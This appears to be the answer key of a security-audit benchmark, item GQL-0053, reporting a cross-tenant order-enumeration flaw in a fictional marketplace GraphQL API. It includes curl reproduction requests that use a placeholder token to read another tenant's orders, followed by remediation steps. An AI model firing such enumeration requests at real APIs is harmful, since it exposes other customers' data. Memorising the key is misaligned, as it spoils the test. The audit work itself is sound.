# Expected Response

## System
- Domain: E-Commerce / Marketplace
- System: ShopGrid Marketplace API
- Example ID: GQL-0053

## Priority Findings

### Finding 1: Cross-Tenant Order Enumeration via bulkOrderLookup — Cross-Service Identity Propagation Drift (Pattern 1.10)
**Severity:** Critical
**Category:** BOLA / Cross-Service Identity Propagation

**Summary:**
The `bulkOrderLookup` mutation on `POST /graphql` accepts arbitrary order IDs without per-ID ownership filtering. An attacker from `tenant-b10d` submitted `["O-2053", "O-1053", "O-3053"]` and received marketplace order data belonging to `tenant-6b80`. Per §5.0 (Pattern 1.10 — cross-service identity propagation drift), the resolver's `orderId`-based lookup does not re-validate the caller's identity in the context of each order's originating service or tenant boundary, allowing identity drift across the multi-tenant order processing chain.

**Evidence from HAR:**
- Request: `POST https://api.shopgrid-marketplace.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-b10d` — attacker's identity
- Mutation payload: `bulkOrderLookup(ids: ["O-2053", "O-1053", "O-3053"]) { orderId tenantId data { sensitiveField } }` — cross-tenant order IDs
- Response HTTP status: `200 OK`
- Response `tenantId`: `tenant-6b80` — victim's order data
- Response `ownerId`: `other-user-b10d6b80`
- Response `sensitiveField`: `CONFIDENTIAL-b10d6b80`
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-b10d6b80`

**Root Cause (§4.0 RISK-GQL-053 + §5.0):** "`bulkOrderLookup` accepts an arbitrary array of IDs without per-ID ownership filtering." The identity of the caller is validated at the gateway but not re-asserted per-object in the resolver.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-053 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 1.10 | "cross-service identity propagation drift — resolver does not enforce ownership" |
| HAR entry | request.postData | `bulkOrderLookup(ids: ["O-2053", "O-1053", "O-3053"])` from `tenant-b10d` |
| HAR entry | response.content | `tenantId: "tenant-6b80"`, `sensitiveField: "CONFIDENTIAL-b10d6b80"` |

---

## Steps to Reproduce

### Step 1 — Bulk cross-tenant order enumeration (HAR attack)
```bash
curl -s -X POST https://api.shopgrid-marketplace.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b10d" \
  -d '{"query": "mutation { bulkOrderLookup(ids: [\"O-2053\", \"O-1053\", \"O-3053\"]) { orderId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-6b80"`, `sensitiveField: "CONFIDENTIAL-b10d6b80"` — cross-tenant marketplace orders.
**Secure outcome:** FORBIDDEN for cross-tenant IDs.

### Step 2 — Cross-tenant single order read via getOrder
```bash
curl -s -X POST https://api.shopgrid-marketplace.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-b10d" \
  -d '{"query": "query { getOrder(id: \"O-2053\") { orderId tenantId ownerId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns `tenant-6b80` order data.

## Remediation
1. **Per-ID ownership filter in bulkOrderLookup:** For each orderId, assert `tenant_id = $jwt.tenantId`.
2. **Resolver tenant guard on getOrder:** `WHERE order_id = $id AND tenant_id = $jwt.tenantId`.
3. **Redis cache key includes tenantId:** §2.0 caches by `orderId` only.
4. **Cross-service identity propagation:** When identity is propagated across services, each downstream resolver must re-assert the caller's `tenantId` against the object's `tenant_id`.
